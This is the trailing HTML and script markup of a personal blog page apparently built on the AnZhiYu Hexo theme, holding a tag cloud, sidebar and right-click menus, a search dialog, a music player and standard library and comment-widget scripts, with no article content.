style="font-size:.88rem">Reverse<sup>1</sup></a><a href="/web/tags/SCIST/" style="font-size:.88rem">SCIST<sup>2</sup></a><a href="/web/tags/SQLi/" style="font-size:.88rem">SQLi<sup>1</sup></a><a href="/web/tags/TechStreak30/" style="font-size:.88rem">TechStreak30<sup>7</sup></a><a href="/web/tags/Web/" style="font-size:.88rem">Web<sup>3</sup></a><a href="/web/tags/Web-Development/" style="font-size:.88rem">Web Development<sup>1</sup></a></div></div><hr></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="Switch Between Traditional Gujarati And Simplified Gujarati">à« </button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><a id="switch-commentBarrage" href="javascript:anzhiyu.switchCommentBarrage();" title="Bullet screen"><i class="anzhiyufont anzhiyu-icon-danmu"></i></a><button id="go-up" type="button" title="Back To Top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">Play music</a><div id="console-music-bg"></div><meting-js type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span> Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"></div></div><hr><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size:1rem"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>Copy</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>Paste</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>Quote it</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>New tab</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>Copy URL</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>Copy image</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>Downlaod</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>New tab</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>Site search</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>Google it</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>Play music</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>Prev track</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>Next track</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://music.youtube.com/playlist?list=PLz77jLOtZQNAaZ7QgOwiixQJVAisGz37e&amp;si=PB17I---rjjEFcT0&quot;, &quot;_blank&quot;);" style="display:none"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>See playlist</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>Song name</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>Random post</span></a><a class="rightMenu-item menu-link" href="/web/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>Categories</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>Tags</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>Share</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">Bullet screen off</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">Light / Dark</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>Simp / Trad</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/web/js/utils.js"></script><script src="/web/js/main.js"></script><script src="/web/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn(){"object"==typeof pangu?pangu.autoSpacingPage():getScript("https://cdn.jsdelivr.net/npm/pangu@4.0.7/dist/browser/pangu.min.js").then(()=>{pangu.autoSpacingPage()})}function panguInit(){GLOBAL_CONFIG_SITE.isPost&&panguFn()}document.addEventListener("DOMContentLoaded",panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script async src="/anzhiyu/random.js"></script><script src="/web/js/search/local-search.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@0.16.0/dist/contrib/copy-tex.min.js"></script><script>document.querySelectorAll("#article-container span.katex-display").forEach(a=>{anzhiyu.wrap(a,"div",{class:"katex-wrap"})})</script><script>(()=>{const e=document.querySelectorAll("#article-container .mermaid-wrap");if(0===e.length)return;const t=()=>{window.loadMermaid=!0;const t="dark"===document.documentElement.getAttribute("data-theme")?"dark":"default";Array.from(e).forEach((e,n)=>{const d=e.firstElementChild,r="mermaid-"+n,a="%%{init:{ 'theme':'"+t+"'}}%%\n"+d.textContent,i=mermaid.render(r,a);var m;"string"==typeof i?(m=i,d.insertAdjacentHTML("afterend",m)):i.then(({svg:e})=>{d.insertAdjacentHTML("afterend",e)})})},n=()=>{window.loadMermaid?t():getScript("https://cdn.jsdelivr.net/npm/mermaid@10.2.4/dist/mermaid.min.js").then(t)};anzhiyu.addGlobalFn("themeChange",t,"mermaid"),window.pjax?n():document.addEventListener("DOMContentLoaded",n)})()</script><script>(()=>{const t=()=>{"object"==typeof twikoo?setTimeout(o,0):getScript("https://cdn.jsdelivr.net/npm/twikoo@1.6.36/dist/twikoo.all.min.js").then(o)},o=()=>{twikoo.init(Object.assign({el:"#twikoo-wrap",envId:"https://comments.S1l3ntC0nquer.in/",region:"",onCommentLoaded:()=>{anzhiyu.loadLightbox(document.querySelectorAll("#twikoo .tk-content img:not(.tk-owo-emotion)"))}},null)),GLOBAL_CONFIG_SITE.isPost&&(()=>{const t=document.getElementById("twikoo-count");t&&twikoo.getCommentsCount({envId:"https://comments.S1l3ntC0nquer.in/",region:"",urls:[window.location.pathname],includeReply:!1}).then(o=>{t.textContent=o[0].count}).catch(t=>{console.error(t)})})()};t()})()</script><input type="hidden" name="page-type" id="page-type" value="post"><script async src="/web/js/anzhiyu/comment_barrage.js"></script></div><script>window.addEventListener("load",()=>{const e=e=>{let t="";if(e.length)for(let n=0;n<e.length;n++){t+="<div class='aside-list-item'>";{const a="data-lazy-src";t+=`<a href='${e[n].url}' class='thumbnail'><img ${a}='${e[n].avatar}' alt='${e[n].nick}'><div class='name'><span>${e[n].nick} </span></div></a>`}t+=`<div class='content'>\n        <a class='comment' href='${e[n].url}' title='${e[n].content}'>${e[n].content}</a>\n        <time datetime="${e[n].date}">${anzhiyu.diffDate(e[n].date,!0)}</time></div>\n        </div>`}else t+="No Comment";let n=document.querySelector("#card-newest-comments .aside-list");n&&(n.innerHTML=t),window.lazyLoadInstance&&window.lazyLoadInstance.update(),window.pjax&&window.pjax.refresh(n)},t=()=>{if(document.querySelector("#card-newest-comments .aside-list")){const t=saveToLocal.get("twikoo-newest-comments");t?e(JSON.parse(t)):(()=>{const t=()=>{twikoo.getRecentComments({envId:"https://comments.S1l3ntC0nquer.in/",region:"",pageSize:6,includeReply:!0}).then((function(t){const n=t.map(e=>{return{content:(t=e.comment,""===t||(t=(t=(t=(t=t.replace(/<img.*?src="(.*?)"?[^\>]+>/gi,"[image]")).replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi,"[link]")).replace(/<pre><code>.*?<\/pre>/gi,"[code]")).replace(/<[^>]+>/g,"")).length>150&&(t=t.substring(0,150)+"..."),t),avatar:e.avatar,nick:e.nick,url:e.url+"#"+e.id,date:new Date(e.created).toISOString()};var t});saveToLocal.set("twikoo-newest-comments",JSON.stringify(n),10/1440),e(n)})).catch((function(e){document.querySelector("#card-newest-comments .aside-list").textContent="Unable to get the data, please make sure the settings are correct."}))};"object"==typeof twikoo?t():getScript("https://cdn.jsdelivr.net/npm/twikoo@1.6.36/dist/twikoo.all.min.js").then(t)})()}};t(),document.addEventListener("pjax:complete",t)})</script><script async data-pjax src= "/web/assets/loading.svg" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.0.0/waterfall/waterfall.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors=['meta[property="og:image"]','meta[property="og:title"]','meta[property="og:url"]','meta[property="og:type"]','meta[property="og:site_name"]','meta[property="og:description"]',"head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!0,scrollRestoration:!1});document.addEventListener("pjax:send",(function(){if(anzhiyu.removeGlobalFnEvent("pjax"),anzhiyu.removeGlobalFnEvent("themeChange"),document.getElementById("rightside").classList.remove("rightside-show"),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();const e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")})),document.addEventListener("pjax:complete",(function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach(e=>{const t=document.createElement("script"),o=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach(e=>t.setAttribute(e.name,e.value)),t.appendChild(document.createTextNode(o)),e.parentNode.replaceChild(t,e)}),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","G-PM5RRNPNEB",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll()})),document.addEventListener("pjax:error",e=>{404===e.request.status&&pjax.loadUrl("/web/404.html")})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="popup-window"><div class="popup-window-title">Reminder</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">Hello!</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>